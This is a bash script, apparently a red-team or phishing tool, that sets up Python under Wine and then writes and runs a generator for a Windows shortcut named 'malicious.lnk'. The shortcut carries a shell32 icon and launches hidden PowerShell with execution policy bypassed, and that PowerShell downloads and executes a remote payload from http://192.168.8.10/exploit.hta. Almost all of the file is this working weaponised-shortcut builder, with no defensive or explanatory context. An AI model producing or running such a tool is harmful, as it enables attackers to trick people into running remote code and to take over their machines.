#!/bin/bash

# sudo dpkg --add-architecture i386
# sudo apt update
# sudo apt install wine32:i386
# sudo apt install --install-recommends wine wine32 wine64 libwine libwine:i386 fonts-wine winbind -y


# sudo apt install wine -y
# wget https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe

# wine python-3.11.5-amd64.exe
# wget https://bootstrap.pypa.io/get-pip.py
# wine C:\\Users\\kaled\\AppData\\Local\\Programs\\Python\\Python311\\python.exe get-pip.py
# wine C:\\Users\\kaled\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\pip.exe install pywin32



filename="lnk-creator.py"

cat <<EOF > $filename
import os
import sys
import pythoncom
from win32com.shell import shell, shellcon

desktop = shell.SHGetFolderPath(0, shellcon.CSIDL_DESKTOP, 0, 0)
path = os.path.join(desktop, "malicious.lnk")

target = "powershell.exe"
arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command iex(iwr http://192.168.8.10/exploit.hta)"
icon = "C:\\Windows\\System32\\shell32.dll"

shortcut = pythoncom.CoCreateInstance(
    shell.CLSID_ShellLink, None, pythoncom.CLSCTX_INPROC_SERVER, shell.IID_IShellLink
)

shortcut.SetPath(target)
shortcut.SetArguments(arguments)
shortcut.SetIconLocation(icon, 0)

persist_file = shortcut.QueryInterface(pythoncom.IID_IPersistFile)
persist_file.Save(path, 0)

EOF

chmod +x $filename

echo "Python script '$filename' created and made executable."

wine 'C:\Python311\python.exe' lnk-creator.py
